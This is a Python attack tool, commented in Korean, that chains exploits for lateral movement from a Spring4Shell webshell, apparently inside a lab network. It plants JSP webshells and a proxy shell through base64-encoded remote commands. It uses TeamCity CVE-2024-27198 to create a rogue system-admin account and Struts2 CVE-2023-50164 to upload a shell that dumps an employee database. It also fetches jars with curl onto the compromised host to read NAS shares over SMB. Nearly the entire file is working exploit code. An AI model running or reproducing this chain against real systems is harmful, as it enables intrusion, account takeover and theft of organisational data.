import requests
import base64
import time
import re
import json
import urllib3
from urllib.parse import urlparse, quote

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class LateralMovementCoordinator:
    """
    내부망 횡적 이동(Lateral Movement) 시나리오 2 & 3 통합 모듈
    기존에 확보한 Spring4Shell Stage2 웹쉘(health_check.jsp)을 거점으로 삼아
    TeamCity, Struts2, 내부 NAS 등을 연쇄적으로 해킹합니다.
    """

    def __init__(self, stage2_url, pwd="glory"):
        parsed = urlparse(stage2_url)
        self.shell_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        self.pwd = pwd
        
        self.teamcity_url = None
        self.proxy_shell_url = f"{parsed.scheme}://{parsed.netloc}/spring-form/proxy.jsp"
        self.struts_shell_url = "http://struts:8080/upload/uploads/faces/index.jsp;x"
        self.struts_db_shell_url = "http://struts:8080/upload/uploads/faces/strutsdb.jsp;x"
        self.nas_shell_url = f"{parsed.scheme}://{parsed.netloc}/nasshell.jsp"

    def execute_rce(self, cmd):
        try:
            resp = requests.get(self.shell_url, params={"pwd": self.pwd, "cmd": cmd}, timeout=15, verify=False)
            cleaned = re.sub(r'if\("glory"\.equals.*?\}\s*\}', '', resp.text, flags=re.DOTALL)
            return cleaned.strip()
        except Exception as e:
            return f"[ERROR] RCE 실패: {str(e)}"

    def _upload_jsp_via_echo(self, jsp_content, target_path_relative):
        """Spring 웹쉘의 RCE를 통해 Base64 덤프 방식으로 서버 내부에 JSP 파일 생성"""
        encoded = base64.b64encode(jsp_content.encode('utf-8')).decode('utf-8')
        cmd = f"/bin/bash -c {{echo,{encoded}}}|{{/usr/bin/base64,-d}}>{target_path_relative}"
        self.execute_rce(cmd)
        time.sleep(1)

    # =========================================================================
    # Scenario 2: TeamCity (CVE-2024-27198) -> Struts2 (CVE-2023-50164)
    # =========================================================================
    
    def run_scenario2_teamcity_struts(self):
        """Step 8: 내부망 TeamCity 침투 및 Struts2 직원 DB 탈취 자동화"""
        results = []
        
        # 1. TeamCity 서버 도메인 탐색
        results.append("[*] 내부망 TeamCity(teamcity-server:8111) 상태 확인...")
        res = self.execute_rce("bash -c 'echo >/dev/tcp/teamcity-server/8111' 2>&1 && echo OPEN || echo CLOSED")
        if "OPEN" in res or res.strip() == "":
            self.teamcity_url = "http://teamcity-server:8111"
            results.append(f"[SUCCESS] TeamCity 서버 발견: {self.teamcity_url}")
        else:
            results.append("[FAIL] TeamCity 서버를 찾을 수 없습니다.")
            return "\n".join(results)

        # 2. HTTP Proxy Shell 업로드 (Spring 서버를 프록시로 사용)
        results.append("[*] Spring 거점 서버에 Proxy Shell 업로드 중...")
        proxy_jsp = """<%@ page import="java.net.*,java.io.*" %>
<%@ page contentType="application/json;charset=UTF-8" %>
<%
String pwd = request.getParameter("pwd");
if (!"glory".equals(pwd)) { out.println("Access Denied"); return; }
String targetUrl = request.getParameter("target");
String method = request.getParameter("method");
if (method == null) method = "GET";
String body = request.getParameter("body");
String authHeader = request.getParameter("auth");
try {
    URL url = new URL(targetUrl);
    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
    conn.setRequestMethod(method);
    conn.setConnectTimeout(8000);
    conn.setReadTimeout(8000);
    conn.setInstanceFollowRedirects(false);
    if (authHeader != null && !authHeader.isEmpty()) conn.setRequestProperty("Authorization", authHeader);
    conn.setRequestProperty("Content-Type", "application/json");
    if ((method.equals("POST") || method.equals("PUT")) && body != null) {
        conn.setDoOutput(true);
        OutputStream os = conn.getOutputStream();
        os.write(body.getBytes("UTF-8"));
        os.flush(); os.close();
    }
    int status = conn.getResponseCode();
    InputStream is = status >= 400 ? conn.getErrorStream() : conn.getInputStream();
    if (is != null) {
        BufferedReader br = new BufferedReader(new InputStreamReader(is, "UTF-8"));
        StringBuilder sb = new StringBuilder(); String line;
        while ((line = br.readLine()) != null) sb.append(line).append("\\n");
        out.println(sb.toString().trim()); br.close();
    }
    conn.disconnect();
} catch (Exception e) { out.println("Error: " + e.getMessage()); }
%>"""
        self._upload_jsp_via_echo(proxy_jsp, "webapps/spring-form/proxy.jsp")
        results.append(f"[SUCCESS] Proxy Shell 활성화: {self.proxy_shell_url}")

        # 3. TeamCity 인증 우회 공격 (CVE-2024-27198) - 관리자 계정 생성
        results.append("[*] TeamCity 대상 CVE-2024-27198 공격(관리자 강제 생성) 시도...")
        admin_body = json.dumps({
            "username": "hacker", "password": "Hacker123!", "email": "hacker@hacker.com",
            "roles": {"role": [{"roleId": "SYSTEM_ADMIN", "scope": "g"}]}
        })
        self._proxy_request(f"{self.teamcity_url}/hax?jsp=/app/rest/users;.jsp", "POST", admin_body)
        
        verify_auth = base64.b64encode(b"hacker:Hacker123!").decode()
        verify_res = self._proxy_request(f"{self.teamcity_url}/app/rest/users", "GET", auth=f"Basic {verify_auth}")
        if "hacker" in verify_res:
            results.append("[SUCCESS] TeamCity 최고 관리자(hacker:Hacker123!) 권한 장악 완료!")
        else:
            results.append("[FAIL] TeamCity 장악 실패.")
            return "\n".join(results)

        # 4. Struts2 RCE 업로드 (CVE-2023-50164)
        results.append("[*] Struts2 서버(struts:8080) 대상 CVE-2023-50164 공격 트리거 중...")
        
        # Struts2용 DB 추출 JSP Payload
        struts_db_payload = """<%@ page import="java.sql.*,java.net.*" %>
<%@ page contentType="text/html;charset=UTF-8" %>
<%
String pwd = request.getParameter("pwd");
if (!"j".equals(pwd)) { out.println("Access Denied"); return; }
String query = request.getParameter("query");
if (query == null || query.isEmpty()) { out.println("No query"); return; }
try {
    Class.forName("com.mysql.cj.jdbc.Driver", true, new URLClassLoader(
        new URL[]{new java.io.File("/usr/local/tomcat/webapps/upload/WEB-INF/lib/mysql-connector-j-8.0.33.jar").toURI().toURL()},
        Thread.currentThread().getContextClassLoader()));
    String url = "jdbc:mysql://struts-db:3306/struts_db?useSSL=false&allowPublicKeyRetrieval=true&serverTimezone=UTC";
    Connection conn = DriverManager.getConnection(url, "struts_user", "struts_pass");
    Statement stmt = conn.createStatement(); ResultSet rs = stmt.executeQuery(query);
    ResultSetMetaData meta = rs.getMetaData(); int cols = meta.getColumnCount();
    StringBuilder sb = new StringBuilder();
    for (int i = 1; i <= cols; i++) { sb.append(meta.getColumnName(i)); if (i < cols) sb.append(" | "); }
    out.println(sb.toString() + "\\n---");
    while (rs.next()) {
        sb = new StringBuilder();
        for (int i = 1; i <= cols; i++) { sb.append(rs.getString(i)); if (i < cols) sb.append(" | "); }
        out.println(sb.toString());
    }
    rs.close(); stmt.close(); conn.close();
} catch (Exception e) { out.println("Error: " + e.getMessage()); }
%>"""
        
        # Spring 컨테이너에 Struts2 전송용 매개 JSP 생성
        struts_sender_jsp = f"""<%@ page import="java.net.*,java.io.*" %>
<%@ page contentType="text/plain;charset=UTF-8" %>
<%
try {{
    String CRLF = "\\r\\n";
    String dbShellContent = new String(java.util.Base64.getDecoder().decode("{base64.b64encode(struts_db_payload.encode()).decode()}"));
    StringBuilder bodyBuilder = new StringBuilder();
    bodyBuilder.append("------WebKitFormBoundary7MA4YWxkTrZu0gW").append(CRLF);
    bodyBuilder.append("Content-Disposition: form-data; name=\\"Upload\\"; filename=\\"test.jpg\\"").append(CRLF);
    bodyBuilder.append("Content-Type: image/jpeg").append(CRLF);
    bodyBuilder.append(CRLF).append(dbShellContent).append(CRLF);
    bodyBuilder.append("------WebKitFormBoundary7MA4YWxkTrZu0gW").append(CRLF);
    bodyBuilder.append("Content-Disposition: form-data; name=\\"uploadFileName\\"").append(CRLF);
    bodyBuilder.append(CRLF).append("strutsdb.jsp").append(CRLF);
    bodyBuilder.append("------WebKitFormBoundary7MA4YWxkTrZu0gW--").append(CRLF);
    byte[] bodyBytes = bodyBuilder.toString().getBytes("UTF-8");
    URL uploadUrl = new URL("http://struts:8080/upload/employee-upload.action");
    HttpURLConnection conn = (HttpURLConnection) uploadUrl.openConnection();
    conn.setRequestMethod("POST"); conn.setDoOutput(true);
    conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW");
    conn.setRequestProperty("Content-Length", String.valueOf(bodyBytes.length));
    OutputStream os = conn.getOutputStream(); os.write(bodyBytes); os.flush(); os.close();
    out.println("STATUS: " + conn.getResponseCode()); conn.disconnect();
}} catch (Exception e) {{ out.println("Error: " + e.getMessage()); }}
%>"""
        
        self._upload_jsp_via_echo(struts_sender_jsp, "webapps/spring-form/struts_attack.jsp")
        parsed = urlparse(self.shell_url)
        attack_trigger_url = f"{parsed.scheme}://{parsed.netloc}/spring-form/struts_attack.jsp"
        requests.get(attack_trigger_url, timeout=15)
        time.sleep(2)
        
        # 5. Struts DB 덤프 실행
        results.append("[*] 내부 임직원망(Struts) DBMS 접근 및 데이터 탈취 중...")
        db_dump_res = self._proxy_request(f"{self.struts_db_shell_url}?pwd=j&query=SELECT+*+FROM+employees", "GET")
        if "id |" in db_dump_res or "EMPLOYEE" in db_dump_res.upper() or "NAME" in db_dump_res.upper():
            results.append("[SUCCESS] 임직원 DB 데이터 탈취 성공!")
            results.append("============== [ EXTRACTED ALIEN DB ] ==============")
            results.append(db_dump_res.strip())
            results.append("====================================================")
        else:
            results.append(f"[FAIL] Struts DB 탈취 실패. 응답: {db_dump_res}")
            
        return "\n".join(results)

    # =========================================================================
    # Scenario 3: NAS (JCIFS SMB) Extraction
    # =========================================================================
    
    def run_scenario3_nas_smb(self):
        """Step 9: JCIFS-NG 동적 로딩을 통한 사내 익명 NAS 파일 목록 탈취"""
        results = []
        results.append("[*] NAS SMB 통신을 위한 외부 Java 라이브러리(JCIFS-NG) Maven 강제 다운로드 중...")
        
        # Maven에서 jar 다운로드
        download_cmds = [
            "curl -L -s -o /tmp/jcifs-ng-2.1.9.jar https://repo1.maven.org/maven2/eu/agno3/jcifs/jcifs-ng/2.1.9/jcifs-ng-2.1.9.jar",
            "curl -L -s -o /tmp/slf4j-api-1.7.36.jar https://repo1.maven.org/maven2/org/slf4j/slf4j-api/1.7.36/slf4j-api-1.7.36.jar",
            "curl -L -s -o /tmp/slf4j-simple-1.7.36.jar https://repo1.maven.org/maven2/org/slf4j/slf4j-simple/1.7.36/slf4j-simple-1.7.36.jar"
        ]
        fail = False
        for cmd in download_cmds:
            self.execute_rce(cmd)
            
        # JAR 존재 여부 확인
        ls_res = self.execute_rce("ls -la /tmp/*.jar")
        if "jcifs" not in ls_res:
             results.append("[FAIL] Maven에서 JCIFS 다운로드 모듈을 받아오지 못했습니다. 네트워크 통신이 막혀있을 수 있습니다.")
             return "\n".join(results)
             
        results.append("[SUCCESS] SMB 라이브러리 다운로드 완료.")
        
        # NAS 웹쉘 업로드
        results.append("[*] NAS 마운트 체인 웹쉘 업로드 중...")
        nas_jsp = """<%@ page import="java.net.*,java.io.*,java.lang.reflect.*,java.util.*" %>
<%@ page contentType="text/plain;charset=UTF-8" %>
<%
String pwd = request.getParameter("pwd");
if (!"glory".equals(pwd)) { out.println("Access Denied"); return; }
try {
    URL jarUrl1 = new File("/tmp/jcifs-ng-2.1.9.jar").toURI().toURL();
    URL jarUrl3 = new File("/tmp/slf4j-api-1.7.36.jar").toURI().toURL();
    URL jarUrl4 = new File("/tmp/slf4j-simple-1.7.36.jar").toURI().toURL();
    URLClassLoader cl = new URLClassLoader(
        new URL[]{jarUrl1, jarUrl3, jarUrl4},
        Thread.currentThread().getContextClassLoader()
    );
    Class<?> propConfigClass = cl.loadClass("jcifs.config.PropertyConfiguration");
    Properties props = new Properties();
    props.setProperty("jcifs.smb.client.minVersion", "SMB10");
    props.setProperty("jcifs.smb.client.maxVersion", "SMB300");
    props.setProperty("jcifs.smb.client.responseTimeout", "10000");
    Object propConfig = propConfigClass.getConstructor(Properties.class).newInstance(props);
    Class<?> baseContextClass = cl.loadClass("jcifs.context.BaseContext");
    Class<?> configInterface = cl.loadClass("jcifs.Configuration");
    Object baseContext = baseContextClass.getConstructor(configInterface).newInstance(propConfig);
    Class<?> authClass = cl.loadClass("jcifs.smb.NtlmPasswordAuthenticator");
    Object auth = authClass.getConstructor(String.class, String.class, String.class)
        .newInstance("", "smbuser", "smbpass");
    Class<?> cifsContextClass = cl.loadClass("jcifs.CIFSContext");
    Method withCredsMethod = null;
    for (Method m : cifsContextClass.getMethods()) {
        if (m.getName().equals("withCredentials")) { withCredsMethod = m; break; }
    }
    Object authCtx = withCredsMethod.invoke(baseContext, auth);
    Class<?> smbFileClass = cl.loadClass("jcifs.smb.SmbFile");
    Object smbFile = smbFileClass.getConstructor(String.class, cifsContextClass)
        .newInstance("smb://nas/data/", authCtx);
    Object[] files = (Object[]) smbFileClass.getMethod("listFiles").invoke(smbFile);
    if (files != null && files.length > 0) {
        for (Object f : files) {
            boolean isDir = (boolean) smbFileClass.getMethod("isDirectory").invoke(f);
            String name = (String) smbFileClass.getMethod("getName").invoke(f);
            out.println((isDir ? "[DIR] " : "[FILE] ") + name);
        }
    } else { out.println("Empty directory"); }
    cl.close();
} catch (Exception e) { out.println("[ERROR] " + e.getMessage()); }
%>"""
        self._upload_jsp_via_echo(nas_jsp, "webapps/ROOT/nasshell.jsp")
        time.sleep(2)
        
        # NAS 접근
        results.append("[*] 내부망 기밀 NAS 서버 데이터 접근 및 목록 탈취 중...")
        nas_res = requests.get(self.nas_shell_url, params={"pwd": "glory"}, timeout=15).text.strip()
        
        if "[FILE]" in nas_res or "[DIR]" in nas_res:
            results.append("[SUCCESS] 내부망 기밀 데이터(도면 등) 접근 성공!")
            results.append("=============== [ NAS FILE LIST ] ===============")
            results.append(nas_res)
            results.append("=================================================")
        else:
            results.append(f"[FAIL] NAS 마운트 실패. 응답: {nas_res}")
            
        return "\n".join(results)

    def _proxy_request(self, target, method, body=None, auth=None):
        params = {"pwd": "glory", "target": target, "method": method}
        if body: params["body"] = body
        if auth: params["auth"] = auth
        try:
            return requests.get(self.proxy_shell_url, params=params, timeout=15).text.strip()
        except Exception:
            return ""

